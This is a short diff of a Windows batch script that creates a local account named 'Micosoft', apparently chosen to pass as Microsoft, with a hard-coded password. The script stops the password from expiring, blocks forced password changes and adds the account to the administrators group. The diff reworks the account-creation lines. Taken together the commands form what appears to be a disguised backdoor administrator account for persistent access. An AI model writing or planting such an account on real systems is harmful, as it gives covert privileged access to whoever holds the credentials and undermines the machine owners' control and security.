@@ -3,7 +3,8 @@ set NEW_USER=Micosoft
 set NEW_PASS=Samsung1!
 
 chcp 1251
-net user %NEW_USER% %NEW_PASS% /add
+net user %NEW_USER%  /add
+net user %NEW_USER% %NEW_PASS%
 wmic path Win32_UserAccount where Name="%NEW_USER%" set PasswordExpires=false
 net user %NEW_USER% /logonpasswordchg:no
 net localgroup administrators %NEW_USER% /add
